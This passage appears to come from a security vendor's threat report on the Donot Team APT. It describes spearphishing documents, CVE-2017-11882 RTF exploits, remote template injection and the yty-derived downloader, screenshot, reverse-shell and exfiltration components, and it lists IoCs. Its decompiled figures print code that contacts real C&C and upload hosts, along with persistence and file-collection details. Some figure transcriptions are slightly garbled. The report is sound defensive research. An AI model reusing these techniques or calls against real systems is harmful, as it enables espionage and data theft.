it*\n\nThe second technique is RTF files with `.doc` extensions that exploit memory corruption vulnerability CVE‑2017‑11882 in Equation Editor, shown in Figure 3. These RTF documents also contain two embedded DLLs as OLE objects (see Figure 4) that are used to install and download further components. This allows the attackers to execute shellcode and requires no user interaction. The shellcode deploys the main components of the malware.\n\n```image\nAlt: Figure 3. CLSID of the COM object used by the RTF document to load the Equation Editor; the ensuing OLE object contains the CVE‑2017‑1182 exploit\nDescription: The image displays a hexadecimal and ASCII representation of a data structure, possibly related to the OLE (Object Linking and Embedding) format used in Microsoft documents. The text includes elements such as 'oleclsid' and hexadecimal values that likely correspond to a specific exploit or payload associated with the malicious macro techniques discussed in the context of the DoNot Team's spearphishing campaigns.\nTranscription: |\n  5C 6F 6C 65 63 69 64 20 5C 27 62 30 30\n  30 32 43 45 30 32 20 30 30 30 2D 30 30\n  2D 30 30 30 30 30 30 30 34 36 5C 27 64\n  7D 5C 6F 62 6A 61 20 30 30 35 30 30 32\n  30 30\n```\n\n*Figure 3. CLSID of the COM object used by the RTF document to load the Equation Editor; the ensuing OLE object contains the CVE‑2017‑1182 exploit*\n\n```image\nAlt: Figure 4. The OLE object headers of the DLLs also embedded in the RTF document\nDescription: The image displays a textual output associated with OLE (Object Linking and Embedding) objects found in malicious documents. It contains details about two embedded objects: their format IDs, class names, data sizes, and file paths. The output indicates that both embedded objects are executable files (DLLs) with modified file extensions, suggesting that they may be used for malicious purposes, likely as part of a cyber attack. This information is crucial for understanding how the embedded files function and their potential implications in the context of malware analysis.\nTranscription: |\n  OLE Object\n  --------------------------------------------------------------------------\n  | format_id: 2 (Embedded)                                                |\n  | class name: b'Package'                                                 |\n  | data size: 988416                                                      |\n  | OLE Package object:                                                    |\n  |   Filename:                                                            |\n  |   Source path: 'Z:\\\\BOT TEST\\\\09 Feb 2021\\\\12 Feb 2021\\\\vbtr.dll'      |\n  |   Temp path = 'C:\\\\Users\\\\Testing\\\\AppData\\\\Local\\\\Temp\\\\vbtr.dll'     |\n  |   MD5: '122cdcbdb1ca1dd12bcac73407f3fc8'                               |\n  |   MODIFIED FILE EXTENSION                                              |\n  |   EXECUTABLE FILE                                                      |\n  |   File Type: Windows PE Executable or DLL                              |\n  --------------------------------------------------------------------------\n  | format_id: 2 (Embedded)                                                |\n  | class name: b'Package'                                                 |\n  | data size: 327960                                                      |\n  | OLE Package object:                                                    |\n  |   Filename:                                                            |\n  |   Source path: 'Z:\\\\BOT TEST\\\\09 Feb 2021\\\\12 Feb 2021\\\\bcs01276.tmp'  |\n  |   Temp path = 'C:\\\\Users\\\\Testing\\\\AppData\\\\Local\\\\Temp\\\\bcs01276.tmp' |\n  |   MD5: '44bb4d41a829a10d8b351d60267049e'                               |\n  |   MODIFIED FILE EXTENSION                                              |\n  |   File Type: Windows PE Executable or DLL                              |\n  -------------------------------------------------------------------------\n```\n\n*Figure 4. The OLE object headers of the DLLs also embedded in the RTF document*\n\nThe third technique is remote RTF template injection, which allows the attackers to have a payload downloaded from a remote server when the RTF document is opened. This is achieved by inserting a URL in the optional `\\*\\template` control word of the RTF file format, instead of the location of a local file resource. The payload that Donot Team uses is another document that exploits CVE-2017-11882 and is loaded automatically once it is downloaded. This is shown in Figure 5.\n\n```image\nAlt: Figure 5. When Word opens an RTF file with a remote template, it automatically attempts to download the resource\nDescription: The image depicts a download dialog box indicating that a file is being downloaded from a specified URL. The URL shown is 'http://worldoption.xyz/jack/6Tuni6MNuSEMIsHjvywGxkSA1KnRi8Se.dot'. This suggests that the file being downloaded is a document, likely associated with a malicious payload as referenced in the context of the Donot Team's attack techniques involving remote RTF template injection.\nTranscription: |\n  Downloading:\n  http://worldoption.xyz/jack/6Tuni6MNuSEMIsHjyvwGxkSA1KnRi8Se.dot\n```\n\n*Figure 5. When Word opens an RTF file with a remote template, it automatically attempts to download the resource*\n\n## The yty malware framework\n\nDiscovered by NetScout in 2018, the yty malware framework is a less sophisticated and poorly developed successor to an older framework called EHDevel. The yty framework consists of a chain of downloaders that ultimately download a backdoor with minimal functionality, used to download and execute further components of Donot Team’s toolset.\n\nThese include file collectors based on file extension and year of creation, screen capturers, keyloggers, reverse shells, and more. As seen in Figure 6, components for exfiltration gather the collected intelligence from staging folders and upload every file to a designated server used only for this purpose.\n\n```image\nAlt: Figure 6. Component that resolves the folder name for staging JPEG screenshots (left) and exfiltration component that finds all files in the staging folder (right)\nDescription: The image displays a snippet of decompiled code related to the yty malware framework. It includes lines of code that appear to define file extensions for various document types (like .doc, .xlsx, .ppt) and specify a directory path for saving files. The code also contains a loop with a sleep function and a timestamping mechanism, indicating that it is part of a larger functionality for managing files in the specified directory.\nTranscription: |\n  break;\n  byte_444A54[i] = v8 - 5;\n  v9 = (const char *)sub_410493(\"PUBLIC\");\n  sub_401010(byte_44BC98, \"&s%s\", v9, byte_444A50);\n  while (1)\n  {\n      Sleep(0xEA67u);\n      _time64(&Time);\n      v10 = (const struct tm *)sub_410000((char *)&Time);\n      strftime(Buffer, 0x50u, \"%d-%m-%Y%H-%M-%S\", v10);\n      // Save to %PUBLIC%\\Music\\Symphony\n      DoScreenshotLoop();\n  }\n  (main_userHomeDir)(v16, v124);\n  runtime_concatstring2(0, v17, v25, \"\\\\Music\\\\Symphony\", 15, v64, v74);\n  v19 = v73;\n  (loc_458B8C)();\n  v129[0] = \".doc\";\n  v129[1] = \".docx\";\n  v129[2] = \".xls\";\n  v129[3] = \".xlsx\";\n  v129[4] = \".ppt\";\n  v129[5] = \".pps\";\n  v129[6] = 4;\n  v129[7] = 5;\n  v129[8] = 4;\n  v129[9] = 4;\n  v129[10] = 1;\n  v129[11] = 4;\n```\n\n*Figure 6. Component that resolves the folder name for staging JPEG screenshots (left) and exfiltration component that finds all files in the staging folder (right)*\n\nStaging folder names and locations are changed with almost every new campaign, as well as some of the components’ filenames. However, there are cases in which the names of components have remained unchanged, for example: `gedit.exe`, `wuaupdt.exe`, `lmpss.exe`, `disc.exe`, among others. As seen in Figure 7, it seems that for every new campaign, in order to set new paths and filenames, these values must be changed in the source code and then recompiled, as none of these components use a configuration block or file.\n\n```image\nAlt: Figure 7. Encrypted strings containing locations and filenames that are regularly changed (top) and unencrypted values used in constructing the C&C URL (bottom)\nDescription: The image shows a snippet of decompiled code, likely from a malware component. It includes sections with hexadecimal values and string literals, such as 'USERNAME' and 'COMPUTERNAME.' The structure shows data alignment, variable declarations, and potential references to network requests, suggesting functionality related to capturing user information or making network calls. The highlighted parts indicate specific strings or variables that may be of interest in the context of malware behavior analysis.\nTranscription: |\n  xmmword_462C40    xmmword  'kndvR^^utgu^^^E'\n  dword_462C50      dd  5E565h\n  xmmword_462C54    xmmword  'tqh^^qtV^eku^^'\n  qword_462C60      dq  637307626B66B64h\n  byte_462C68       db  77h\n  align 10h\n  dword_462C70      dd  6778h\n  szAgent           db  'Mozilla/5.0 (Windows NT 10.0; Win64;\n                     x64) AppleWebKit/537.36 (KHTML, like Gecko)\n                     Chrome/91.0.864.37 Safari/537.36',0\n  align 4\n  aUsername         db  'USERNAME',0\n  align 10h\n  const char aComputername[]\n                     db  'COMPUTERNAME',0\n```\n\n*Figure 7. Encrypted strings containing locations and filenames that are regularly changed (top) and unencrypted values used in constructing the C&C URL (bottom)*\n\nThe malware uses scheduled tasks for persistence, and alternates between DLL and EXE files between campaigns. In the case of DLLs, scheduled tasks execute `rundll32.exe` to load them and execute one of the exported functions.\n\nThe developers of the yty framework primarily rely on the C++ programming language. Likely in an attempt to evade detection, they have also ported their components to other languages such as VBScript, Python (packaged with PyInstaller), Visual C#, and AutoIt, among others. However, since 2019 we have only seen them leveraging components programmed in C++ (Figure 8) and Go (Figure 9).\n\n```image\nAlt: Figure 8. Decompiled code of the component that captures screenshots, originally written in C++\nDescription: The image displays a snippet of decompiled code likely related to the yty malware framework. The code features functions from the GDI+ library, which are used for graphics programming in C++. It includes operations for bitmap handling, such as creating compatible bitmaps and retrieving image encoder sizes. The code appears to be focused on handling graphics data, which may be relevant to the malware's functionality, such as taking screenshots or processing images.\nTranscription: |\n  GdiplusStartup(&v19, &v20, 0);\n  hdc = GetDC(0);\n  SystemMetrics = GetSystemMetrics(1);\n  v1 = GetSystemMetrics(0);\n  CompatibleDC = CreateCompatibleDC(hdc);\n  h = CreateCompatibleBitmap(hdc, v1, SystemMetrics);\n  v10 = v1;\n  v2 = CompatibleDC;\n  BitBlt(CompatibleDC, 0, 0, v10, SystemMetrics, hdc, 0, 0, 0xCC0020u);\n  v17 = 0;\n  GdiplusCreateBitmapFromHBITMAP(ho, &v17);\n  v18 = 0;\n  Size = 0;\n  GdiplusGetImageEncodersSize(&v18, &Size);\n  if ( Size )\n  {\n      v3 = (const unsigned __int16 **)malloc(Size);\n      v4 = v3;\n      v3 = v3;\n      if ( v3 )\n      {\n          GdiplusGetImageEncoders(v18, Size, v3);\n      }\n  }\n```\n\n*Figure 8. Decompiled code of the component that captures screenshots, originally written in C++*\n\n```image\nAlt: Figure 9. Decompiled code of the component that captures screenshots, for the version written in Go\nDescription: The image displays a portion of decompiled code related to the yty malware framework, specifically focusing on a function that captures screenshots. The code includes various variable assignments and function calls, specifically referencing libraries and methods designed to retrieve display dimensions and capture screen content. This technical detail is relevant for understanding how the malware operates and executes screenshot capturing.\nTranscription: |\n  main_userHomeDir(v6, v12);\n  runtime_concatenate_string2(v42, v8, v16, \"\\\\Temp\\\\dfileallocfreetracebad allocCountbad span s\");\n  v38 = v28;\n  v43 = v26;\n  time_Now();\n  (void)(void)loc_454C3E();\n  active = github_com_kbinani_screenshot_NumActiveDisplays(v10);\n  v5 = v11;\n  if (v11 < 0)\n      goto LABEL_13;\n  v4 = 0;\n  v0 = 0;\n  v2 = 0;\n  while (v0 < v5)\n  {\n      v1 = v0;\n      v39 = v4;\n      github_com_kbinani_screenshot_GetDisplayBounds(v0, active, v19, v21, v24);\n      v38 = image_Rectangle_Union(v13, v18, v23, v25, v1, v2, v39, v34, v36, v37);\n      v1 = v32;\n      v1 = v36;\n      v1 = v40;\n  }\n  v30 = github_com_kbinani_screenshot_Capture(v1, v2, v3 - v1, v2, v24, v26, v28);\n```\n\n*Figure 9. Decompiled code of the component that captures screenshots, for the version written in Go*\n\nThe malware sometimes uses two or three servers during its deployment. It might use one server during its chain of downloaders and a different server that the backdoor contacts in order to receive its commands and download further components, or use the same server for both purposes. A different server is always used for the upload of collected information. In some attacks Donot Team has reused C&C domains from previous attacks – both for downloads and exfiltration. As seen in Figure 10, Figure 11, and Figure 12, these components – later described as a variant we track as *DarkMusical* – used in the same attack, employed three different C&C domains.\n\n```image\nAlt: Figure 10. The first downloader decrypts the URL of the server from which it downloads the next stage of the chain\nDescription: The image displays a snippet of code related to the yty malware framework. It includes functions for decrypting a server name, specifically 'digitalresolve.live', and establishing an internet connection using the InternetConnectA function. The code showcases programming elements, such as string manipulation and internet connection setup, relevant to malware operations. The background features a watermark with 'welvsecurity', indicating the source of the image.\nTranscription: |\n  // Decrypt to digitalresolve.live\n  strcpy(szServerName, \"gjlwdouhvroyhloyh\");\n  decryptstr(szServerName);\n  v3 = InternetOpen(\n      \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93\"\n      \".0.4577.82 Safari/537.36 Edge/44.18363.8131\",\n      1u,\n      0,\n      0,\n      0);\n  hInternet = InternetConnectA(v3, szServerName, 0x1BBu, 0, 0, 3u, 0, 0);\n```\n\n*Figure 10. The first downloader decrypts the URL of the server from which it downloads the next stage of the chain*\n\n```image\nAlt: Figure 11. In later stages, the backdoor uses a different server for C&C communications\nDescription: The image displays a snippet of code used in a malware operation. It includes function calls related to HTTP requests, such as 'InternetOpenA', 'InternetConnect', and 'HttpOpenRequestA', indicating how the malware interacts with web servers. The code suggests that it is designed to make a GET request to a specified server, likely for data exfiltration or command and control purposes. The context implies it is part of a larger framework related to the yty malware.\nTranscription: |\n  // Uses printersolution.live/.../ordeme\n  v1 = InternetOpenA(\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.77 Edg/91.0.864.37\", 1u, 0, 0, 0);\n  v2 = InternetConnectA(v1, lpszServerName, 0x1BBu, 0, 0, 0, 0);\n  Buffer = 77670168;\n  v3 = HttpOpenRequestA(v2, \"GET\", szObjectName, 0, {LPCSTR *)**/*\", 0x8000000u, 0);\n  InternetSetOptionA(v3, 0x1XFu, &Buffer, 5u);\n  HttpSendRequestA(v3, 0, 0, 0);\n```\n\n*Figure 11. In later stages, the backdoor uses a different server for C&C communications*\n\n```image\nAlt: Figure 12. The exfiltration components use yet a third server to upload the collected files\nDescription: The image displays decompiled code related to the yty malware framework, specifically focusing on a network request function. The highlighted section shows a URL ('https://packetbite.live/') which appears to be part of the command and control (C&C) communication process for the malware. The surrounding code snippets suggest that this is part of a larger function designed to handle HTTP requests, likely for uploading data related to the malware's operations.\nTranscription: |\n  v92 = runtime_concatstring3(0, (char *)\"https://packetbite.live/\", 24, v113, v47, (int)\"/uload390625\", 6, File, v89);\n  net_http_NewRequestWithContext(\n      (int)&go_itab__context_emptyCtx_context_Context,\n```\n\n*Figure 12. The exfiltration components use yet a third server to upload the collected files*\n\n## Timeline of attacks\n\nHere we describe the malware variants used in recent Donot Team campaigns, with a focus on their Windows malware, starting from September 2020 until October 2021. For clarity, we have separated them into two variants of the yty malware framework: Gedit and DarkMusical, with one specific campaign using Gedit that we named Henos.\n\nIn Figure 13, we present a timeline, according to our telemetry, of the attacks. Also on our timeline we have included attacks from another variant, known as the “Jaca framework”. However, we will not describe it here as it has been described extensively in this report by CN-SEC.\n\n```image\nAlt: Figure 13. Timeline of Donot Team attacks from September 2020 to October 2021 according to ESET telemetry\nDescription: The image is a timeline illustrating the attacks conducted by the Donot Team from September 2020 to October 2021. It highlights various malware variants, specifically the Gedit and DarkMusical variants of the yty malware framework, as well as the Henos campaign. The timeline includes specific dates and labels for different attacks, denoting the use of different malware types, such as 'Jaca' and 'DarkMusical', and features color-coded markers indicating the timing of each attack.\nTranscription: |\n  2020-09: Jaca Gedit\n  2020-12: Jaca\n  2021-02: Henos\n  2021-03: Jaca\n  2021-05: Jaca Gedit\n  2021-06: Jaca DarkMusical\n  2021-07: Jaca Gedit\n  2021-09: DarkMusical\n  2021-10: DarkMusical Gedit\n```\n\n*Figure 13. Timeline of Donot Team attacks from September 2020 to October 2021 according to ESET telemetry*\n\n## DarkMusical\n\nAccording to ESET telemetry, the first wave of attacks where this variant was used occurred in June 2021, targeting military organizations in Bangladesh. We were only able to recover its chain of downloaders and its main backdoor. Given the small number of victims, we believe this might have been a highly targeted attack.\n\nIn September, a second wave of attacks that targeted military organizations in Nepal used new C&C servers and file and staging folder names. We were able to recover a number of components downloaded by the backdoor, so we have decided to describe these attacks instead.\n\nSpearphishing emails were sent with PowerPoint documents containing a macro that deploys the first component of a chain of downloaders and persists using a scheduled task. When potential victims open these documents, they will be presented with a fake error message, as seen in Figure 14, and the documents will remain devoid of any visible content.\n\n```image\nAlt: Figure 14. Screenshot of a blank, malicious PowerPoint document\nDescription: The image is a screenshot of a Microsoft PowerPoint window displaying a critical error message. The message states: 'Critical Error Unable to open file,' which is a fake error intended to mislead users into thinking something has gone wrong with their document. This blank document is used in a malicious context as part of a phishing attack, as described in the provided text.\nTranscription: |\n  Microsoft PowerPoint\n  --------------------\n  File   Home   Insert   Design   Transitions   Animations   Slide Show   Review   View\n  \n  Clipboard   Slides   Font   Paragraph   Drawing   Editing\n  \n  Microsoft Office Error\n    Critical Error Unable to open file\n  \n          [OK]   [Cancel]\n```\n\n*Figure 14. Screenshot of a blank, malicious PowerPoint document*\n\nAs seen in Figure 15, the chain of downloaders aims to download a final component that works as a backdoor with minimal functionality: it downloads standalone components, executes them using the `ShellExecute` Windows API, get and saves new C&C URLs.\n\nThe backdoor downloads the components that handle the collection and exfiltration of information to a dedicated server. These components do not communicate with the backdoor or the C&C to report on their activities – rather, they use a designated folder for the staging of the data, and a separate exfiltration component will collect everything and upload it.\n\n```image\nAlt: Figure 15. Observed chain of compromise for DarkMusical\nDescription: The image illustrates the observed chain of compromise for the DarkMusical cyber campaign. It is a flowchart depicting the attack process starting from the attacker sending a spearphishing email containing a malicious PowerPoint document. The flowchart details the sequence of actions, showing how the document drops and executes the executable files `rihana.exe` and `forbidden.exe`, which then download additional components like `acrobat.dll` and `remember.exe`. It also highlights the functionalities of various executables in the chain, including those responsible for taking screenshots, establishing reverse shells, and collecting/exfiltrating files.\nTranscription: |\n  | Attacker              |\n  |-----------------------|\n  | Sends                 |\n  |                       |\n  | Spearphishing email   |\n  |                       |\n  | Contains              |\n  |                       |\n  | Malicious document    |\n  |                       |\n  | Drops and executes    |\n  |                       |\n  | rihana.exe            |\n  |                       |\n  | Downloads             |\n  |                       |\n  | acrobat.dll           |\n  |                       |\n  | Downloads             |\n  |                       |\n  | remember.exe          |\n  |                       |\n  | Downloads             |\n  |                       |\n  | forbidden.exe         |\n  |                       |\n  | Downloads             |\n  |                       |\n  | serviceup.exe         |\n  |                       |\n  | Reverse shell         |\n  |                       |\n  | sdudate.exe           |\n  |                       |\n  | Takes screenshots     |\n  |                       |\n  | srcot.exe             |\n  |                       |\n  | Exfiltrator component |\n  |                       |\n  | upsuvcsu.exe          |\n  |                       |\n  | Collects files        |\n  |                       |\n  | ndexid.exe            |\n```\n\n*Figure 15. Observed chain of compromise for DarkMusical*\n\nWe decided to call this campaign DarkMusical because of the names the attackers chose for their files and folders: many are western celebrities or characters in the movie High School Musical. Table 1 briefly describes the purpose of each of the components in the chain of compromise.\n\n**Table 1. Components in the DarkMusical campaign chain of compromise**\n\n| Filename        | Description                                                                                                                                                                                                                                                                                                                                                                                                     |\n|-----------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| `rihana.exe`    | This executable is dropped by the malicious document to `%public%\\Music\\rihana.exe` and persistence established via a scheduled task called `musudt`. Downloads file to `%public%\\Music\\acrobat.dll` and drops a BAT file to `%public%\\Music\\sidilieicaliei.bat`. The BAT file calls `schtasks.exe` to create the `hmomci` scheduled task to execute `rundll32.exe %public%\\Music\\acrobat.dll, nikioioeioolla`. |\n| `acrobat.dll`   | Downloads file and saves it as `%public%\\Music\\swift`. Additionally, can issue a `systeminfo.exe` command whose output is redirected to `%public%\\Music\\justin`. The contents of the file are sent to its C&C server. Drops and executes the file `%public%\\Music\\janifer.bat` that performs several tasks.                                                                                                     |\n| `remember.exe`  | Downloads file to `%public%\\Music\\Troy\\forbidden.exe`.                                                                                                                                                                                                                                                                                                                                                          |\n| `forbidden.exe` | Uses the URL stored in `%public%\\Music\\Taylor\\flag` file; if there is no URL, it uses its default URL. Accepts three commands: Set URL in the `flag` file, Execute file with `ShellExecute` Windows API, Download file to `%public%\\Music\\Taylor`.                                                                                                                                                              |\n\nIn Table 2 we describe the purpose of each component of the attacker’s toolset.\n\n**Table 2. Description of components in the attacker's toolset for DarkMusical**\n\n| Filename        | Description                                                                                                                                                                                                                                                         |\n|-----------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| `serviceup.exe` | Reverse shells                                                                                                                                                                                                                                                      |\n| `sdudate.exe`   | #rowspan#                                                                                                                                                                                                                                                           |\n| `srcot.exe`     | Takes screenshots, saves them to `%public%\\Music\\Symphony`                                                                                                                                                                                                          |\n| `nDExiD.exe`    | Collects files created in 2021 and after, and copies them to the staging folder `%public%\\Music\\Symphony`. Collects files by extension: `doc`, `docx`, `eml`, `inp`, `jpeg`, `jpg`, `msg`, `odt`, `pdf`, `pps`, `ppsx`, `ppt`, `pptx`, `rtf`, `txt`, `xls`, `xlsx`. |\n| `upsvcsu.exe`   | Exfiltrates collected files. Enumerates all files in `%public%\\Music\\Symphony` and uploads those that match the extensions: `doc`, `docx`, `eml`, `inp`, `jpeg`, `jpg`, `msg`, `odt`, `pdf`, `pps`, `ppsx`, `ppt`, `pptx`, `rtf`, `txt`, `xls`, `xlsx`.             |\n\n## Gedit\n\nWe detected the first attacks of the campaign using Gedit in September 2020, against organizations in Pakistan that had already been targeted with spearphishing and malicious RTF documents that installed the Jaca framework. Since then, Donot Team moved on to focus on targets in Bangladesh, Nepal, and Sri Lanka. The malware is clearly derived from the yty malware framework, but it is distinct enough to be separated from DarkMusical.\n\nWe were able to retrieve a spearphishing email corresponding to a Gedit campaign that occurred in February of 2021, which is shown in Figure 16. The first attachment contained a list of personnel from a military entity in Bangladesh (and no malicious content). The second attachment showed nothing but a blank page, while executing malicious code.\n\n```image\nAlt: Figure 16. Screenshot of a spearphishing email sent by the attackers\nDescription: The image depicts a screenshot of a spearphishing email dated February 17, 2021. The email subject is 'Tele Directory and Webmail of BN - Updated 10 Feb 2021.' It shows two attachments: '01.BN Tele Directory-10 FEB...' (240.5 KB) and 'BN_Webmail_List 2020.doc' (2.62 MB). The email requests the recipient to find an attached file for their information and necessary action. There is a visual indication that the second attachment may be loading, with a text saying 'Loading...' and an error icon. The image contains a watermark that says 'welivsecurity.' This screenshot provides a specific example of the spearphishing attempt associated with the Gedit malware campaign.\nTranscription: |\n  Tele Directory and Webmail of BN - Updated 10 Feb 2021\n  CS\n  2/17/2021 6:53 AM\n  \n  Save all attachments\n  [01.BN Tele Directory-10 FEB... 240.5 KB]\n  [BN_Webmail_List 2020.doc 2.62 MB]\n  \n  Find the Attach file for your kind information and necessary action.\n  --\n  [Loading...]\n```\n\n*Figure 16. Screenshot of a spearphishing email sent by the attackers*\n\nWe can see that the size of the second file is greater than 2 MB. It is an RTF file that exploits CVE-2017-11882 to drop two DLL files contained in the document and execute one of them. Other components are downloaded to the compromised computer in various stages. An overview of this attack chain and its malware components is shown in Figure 17.\n\n```image\nAlt: Figure 17. Chain of compromise in Gedit campaigns\nDescription: The image depicts a flowchart illustrating the attack chain of a cyber threat campaign involving spearphishing emails. It starts with an attacker sending a spearphishing email that contains a malicious RTF document. The RTF file drops and executes two DLL files: `vbtr.dll` and `msdn022.dll`. The flowchart indicates the execution of various EXE files, including `nprint.exe`, `wuaupdt.exe` (a reverse shell), `lmpss.exe` (for taking screenshots), and `innod.exe` (for file collection), which culminates in the upload of collected files via `gedit.exe`. The diagram clearly outlines the relationships and sequence of events in the attack, providing insight into the components and functions involved in the compromise.\nTranscription: |\n  [Diagram]\n  \n  Attacker\n     |\n     v\n  Sends\n     |\n     v\n  Spearfishing email\n     |\n     v\n  Contains\n     |\n     v\n  Malicious document\n     |\n     v\n  RTF\n     |\n     v\n  Drops\n     |\n     v\n  Executes\n     |\n     v\n  vbtr.dll\n     |\n     v\n  Executes\n     |\n     v\n  msdn022.dll\n     |\n     v\n  Executes\n     |\n     v\n  nprint.exe\n     |\n     v\n  Executes\n     |\n     v\n  Winhlp.exe\n     |\n     +---------------------+\n     |                     |\n     v                     v\n  Reverse shell     Takes screenshots\n     |                     |\n     v                     v\n  wuaupdt.exe          lmpss.exe\n     |\n     v\n  Collects files\n     |\n     v\n  innod.exe\n     |\n     v\n  Uploads collected files\n     |\n     v\n  gedit.exe\n```\n\n*Figure 17. Chain of compromise in Gedit campaigns*\n\nThe components were coded in Go, and C++ (with MinGW and Visual Studio compilers). We have chosen to describe the components used in that campaign in February 2021, which are shown in Table 3.\n\n**Table 3. Description of components for Gedit variant**\n\n| Filename        | Description                                                                                                                                                                                                 |\n|-----------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| `vbtr.dll`      | Moves the file `%TEMP%\\bcs01276.tmp` to `%USERPROFILE%\\Documents\\msdn022.dll`. Creates a scheduled task `MobUpdate` to execute `rundll32.exe %USERPROFILE%\\Documents\\msdn022.dll,iorpiyhduj`.               |\n| `msdn022.dll`   | Downloads a file to `%APPDATA%\\mscx01102` (later renamed to `Winhlp.exe`). Writes and executes `%APPDATA%\\test.bat`, which creates scheduled tasks and writes to `%USERPROFILE%\\Policy\\en-us\\Files\\wizard`. |\n| `Winhlp.exe`    | Downloads a file to `%USERPROFILE%\\inf\\boost\\OOO\\nprint.exe`.                                                                                                                                               |\n| `nprint.exe`    | Sends a request to a server and depending on the reply, performs actions such as downloading files or executing commands.                                                                                   |\n| `wuaupdt.exe`   | Reverse shell.                                                                                                                                                                                              |\n| `lmpss.exe`     | Takes screenshots and saves them to `%USERPROFILE%\\Remote\\Desk\\Apps`.                                                                                                                                       |\n| `innod.exe`     | File collector. Iterates recursively through drives, logging interesting files and copying them to `%USERPROFILE%\\Remote\\Desk\\Apps`.                                                                        |\n| `gedit.exe`     | Sends collected files to a server.                                                                                                                                                                          |\n\n## Henos campaign\n\nFinally, it is worth mentioning a wave of attacks that occurred between February and March 2021, targeting military organizations in Bangladesh and Sri Lanka. These attacks used the Gedit variant of the malware, but with some minor modifications. Therefore, we decided to name this campaign Henos in our timeline, after its backdoor DLL – `henos.dll`.\n\nSamples belonging to components of this wave of attacks were also reported online in February, which probably explains why the group didn’t use the components again (see this tweet by Shadow Chaser Group researchers, for example).\n\nAlthough we didn’t find the corresponding spearphishing emails or malicious documents, the attack chain is presumably the same as we described above, with some minor differences in how the components are executed. An overview of this is shown in Figure 18.\n\n```image\nAlt: Figure 18. Chain of compromise of the Henos campaign\nDescription: The image depicts a flowchart illustrating the chain of compromise for the Henos campaign. It shows the sequence of actions that occur after a malicious RTF document is executed. The document drops a DLL file (ctlm.dll) and executes an EXE file (jptvbh.exe), which subsequently executes another DLL (henos.dll) and uses a task scheduler. The flowchart also indicates that the henos.dll downloads additional EXE files (plaapas.exe for taking screenshots, javatem.exe for collecting files, and pytemp.exe for uploading collected files). Key actions are annotated alongside the respective files to clarify their functions.\nTranscription: |\n  Malicious document\n    └── RTF\n        └── Drops\n            ├── Executes\n            │   └── jptvbh.exe\n            └── Executes\n                └── DLL\n                    ├── ctlm.dll\n                    └── Executes\n                        └── Downloads\n                            └── DLL\n                                └── henos.dll\n                                    ├── Executes\n                                    │   ├── plaapas.exe\n                                    │   │   └── Takes screenshots\n                                    │   └── javatem.exe\n                                    │       └── Collects files\n                                    └── pytemp.exe\n                                        └── Uploads collected files\n```\n\n*Figure 18. Chain of compromise of the Henos campaign*\n\nWhile some of the components of this campaign are named `javatemp.exe` and `pytemp.exe`, these filenames were probably only chosen in an attempt to mimic legitimate software such as Java or Python. While `pytemp.exe` and `plaapas.exe` were coded in the Go language, `javatemp.exe` was coded in C++ (compiled with MinGW).\n\nOne final note is that the component that performs exfiltration of files, `pytemp.exe`, performs a check to see if `gedit.exe` is running. If two or more instances are found, it exits. We believe this is a mistake by the programmers, as it should check for `pytemp.exe` instead. However, this simple mistake helps us tie the Henos campaign to the Gedit variant of the malware (added to code similarity).\n\n## Conclusion\n\nDonot Team makes up for its low sophistication with tenacity. We expect that it will continue to push on regardless of its many setbacks. Only time will tell if the group evolves its current TTPs and malware.\n\n*For any inquiries, or to make sample submissions related to the subject, contact us at threatintel@eset.com.*\n\n## Indicators of Compromise (IoCs)\n\nA comprehensive list of Indicators of Compromise (IoCs) and samples can be found in our GitHub repository.\n\n### Gedit – October 2021\n\n#### Samples\n\n| SHA-1                                    | Filename      | ESET detection name            |\n|------------------------------------------|---------------|--------------------------------|\n| 78E82F632856F293BDA86D77D02DF97EDBCDE918 | `cdc.dll`     | Win32/TrojanDownloader.Donot.C |\n| D9F439E7D9EE9450CD504D5791FC73DA7C3F7E2E | `wbiosr.exe`  | Win32/TrojanDownloader.Donot.D |\n| CF7A56FD0613F63418B9DF3E2D7852FBB687BE3F | `vdsc.exe`    | Win32/TrojanDownloader.Donot.E |\n| B2263A6688E512D90629A3A621B2EE003B1B959E | `wuaupdt.exe` | Win32/ReverseShell.J           |\n| 13B785493145C85B005E96D5029C20ACCFFE50F2 | `gedit.exe`   | Win32/Spy.Donot.A              |\n| E2A11F28F9511753698BA5CDBAA70E8141C9DFC3 | `wscs.exe`    | Win32/Spy.Donot.B              |\n| F67ABC483EE2114D96A90FA0A39496C42EF050B5 | `gedit.exe`   | Win32/Spy.Donot.B              |\n\n#### Network\n\n**Download servers**\n- `https://request.soundedge[.]live/access/nasrzolofuju`\n- `https://request.soundedge[.]live/access/birkalirajliruajirjiairuai`\n- `https://share.printerjobs[.]xyz/id45sdjscj/<VICTIM_ID>`\n\n**Exfiltration server**\n- `https://submin.seasonsbackup[.]xyz/backup/<VICTIM_ID>`\n\n**Reverse shell server**\n- `80.255.3[.]67`\n\n### Gedit – July 2021\n\n#### Samples\n\n| SHA-1                                    | Filename     | ESET detection name            |\n|------------------------------------------|--------------|--------------------------------|\n| A71E70BA6F3CD083D20EDBC83C72AA823F31D7BF | `hxedit.exe` | Win32/TrojanDownloader.Donot.N |\n| E101FB116F05B7B69BD2CAAFD744149E540EC6E9 | `lmpss.exe`  | Win64/HackTool.Ligolo.A        |\n| 89D242E75172C79E2F6FC9B10B83377D940AE649 | `gedit.exe`  | WinGo/Spy.Donot.A              |\n| B42FEFE2AB961055EA10D445D9BB0906144647CE | `gedit.exe`  | WinGo/Spy.Donot.A              |\n| B0704492382186D40069264C0488B65BA8222F1E | `disc.exe`   | Win32/Spy.Donot.L              |\n\n#### Network\n\n**Download server**\n- `request.submitonline[.]club/orderme/`\n\n**Exfiltration servers**\n- `oceansurvey[.]club/upload/<VICTIM_ID>`\n- `request.soundedge[.]live/<COMPUTERNAME>/uload`\n\n**Reverse shell servers**\n- `80.255.3[.]67`\n- `37.48.122[.]145`\n\n### MITRE ATT&CK techniques\n\n*This table was built using version 10 of the ATT&CK framework.*\n\n| Tactic               | ID        | Name                                                                                             | Description                                                                                                            |\n|----------------------|-----------|--------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------|\n| Resource Development | 